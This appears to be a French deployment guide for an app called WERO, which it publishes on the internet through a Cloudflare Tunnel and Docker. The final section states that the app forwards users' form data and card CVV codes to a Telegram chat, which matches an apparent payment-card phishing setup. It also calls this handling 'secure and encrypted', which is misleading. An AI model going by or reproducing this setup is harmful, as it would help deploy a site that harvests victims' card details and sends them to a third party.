# 🚀 Déploiement WERO avec Cloudflare Tunnel + Docker

## 📋 Prérequis

- Docker & Docker Compose installés
- Compte Cloudflare (gratuit)
- Token Telegram Bot + Chat ID (voir `.env`)

## 🔧 Étape 1 : Créer un Tunnel Cloudflare

### Option A : Via Dashboard Cloudflare (Recommandé)

1. Va sur **https://dash.cloudflare.com/tunnels**
2. Clique **"Create a tunnel"**
3. Nomme-le `wero`
4. Sélectionne **"Docker"** comme environnement
5. Suis les instructions pour obtenir le **TOKEN**
6. Configure le hostname :
   - URL: `localhost:3000`
   - Service: `http`
7. Copie le token complet

### Option B : Via CLI cloudflared

```bash
# Installation (si nécessaire)
brew install cloudflare/cloudflare/cloudflared  # macOS
# ou télécharge depuis: https://github.com/cloudflare/cloudflared

# Créer le tunnel
cloudflared tunnel login
cloudflared tunnel create wero
cloudflared tunnel token wero
```

## 🔑 Étape 2 : Configurer les Variables d'Environnement

### Copie `.env.cloudflare`
```bash
cp .env.cloudflare .env.production
```

### Édite `.env.production` et ajoute :

```env
# Telegram (déjà configuré)
TELEGRAM_BOT_TOKEN=[REDACTED]
TELEGRAM_CHAT_ID=8176081750

# Cloudflare Tunnel Token (obtenu à l'étape 1)
CLOUDFLARE_TOKEN=eyJhIjoiXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

## 🐳 Étape 3 : Démarrer avec Docker Compose

### Rebuild l'image avec cloudflared
```bash
docker compose build --no-cache nodejs
```

### Démarrer les services avec le tunnel
```bash
docker compose --env-file .env.production up -d
```

## ✅ Étape 4 : Vérifier le Déploiement

### Vérifier que tout fonctionne
```bash
# Voir les logs
docker compose logs nodejs -f

# Chercher "Cloudflare Tunnel" dans les logs
docker compose logs nodejs | grep -i cloudflare

# Tester l'app localement
curl http://localhost:8002

# Tester Telegram
curl -X POST http://localhost:8002/api/test-telegram
```

### Accéder à l'app publiquement

1. Va sur le **Dashboard Cloudflare**
2. Cherche ton tunnel **"wero"**
3. Tu verras l'URL publique (ex: `https://wero-abc123.trycloudflare.com`)
4. **L'app est maintenant accessible publiquement ! 🎉**

## 📊 Monitoring & Logs

### Voir les logs en temps réel
```bash
docker compose logs nodejs -f
```

### Voir le statut du tunnel
```bash
docker compose logs nodejs | grep "tunnel"
```

### Redémarrer le tunnel
```bash
docker compose restart nodejs
```

## 🛑 Arrêter le Déploiement

```bash
docker compose down
```

## 🔒 Sécurité

| Feature | Status |
|---------|--------|
| HTTPS | ✅ Automatique |
| DDoS Protection | ✅ Inclus |
| Ports fermés | ✅ Aucun port ouvert |
| Firewall | ✅ Cloudflare |
| Tunnel chiffré | ✅ TLS 1.3 |

## 🚨 Troubleshooting

### Tunnel ne se connecte pas
```bash
# Vérifier le token
docker compose logs nodejs | grep -i error

# Redémarrer
docker compose restart nodejs
```

### App inaccessible publiquement
1. Vérifie le Dashboard Cloudflare
2. Vérifie que le tunnel est "Connected" (vert)
3. Vérifie que l'app répond localement: `curl http://localhost:8002`

### Telegram ne reçoit pas les messages
1. Vérifie `TELEGRAM_BOT_TOKEN` dans `.env`
2. Teste: `curl -X POST http://localhost:8002/api/test-telegram`
3. Vérifie le Chat ID

## 📝 Architecture

```
┌─────────────────────────────────────────┐
│         Internet (Public)               │
└────────────────┬────────────────────────┘
                 │
         ┌───────▼────────┐
         │  Cloudflare    │
         │  CDN/Tunnel    │
         │  (HTTPS)       │
         └───────┬────────┘
                 │
         ┌───────▼────────┐
         │ Docker Host    │
         │                │
         │ ┌────────────┐ │
         │ │ Node.js    │ │
         │ │ WERO App   │ │
         │ │ :3000      │ │
         │ └────────────┘ │
         │ ┌────────────┐ │
         │ │ MySQL      │ │
         │ │ :3306      │ │
         │ └────────────┘ │
         └────────────────┘
```

## 📞 Support Telegram

L'app envoie les données des utilisateurs à Telegram automatiquement :
- ✅ Accord accepté
- ✅ Données du formulaire
- ✅ CVV (alertes séparées)

Tout est sécurisé et chiffré ! 🔐

---

**Déployé avec ❤️ sur Cloudflare + Docker**
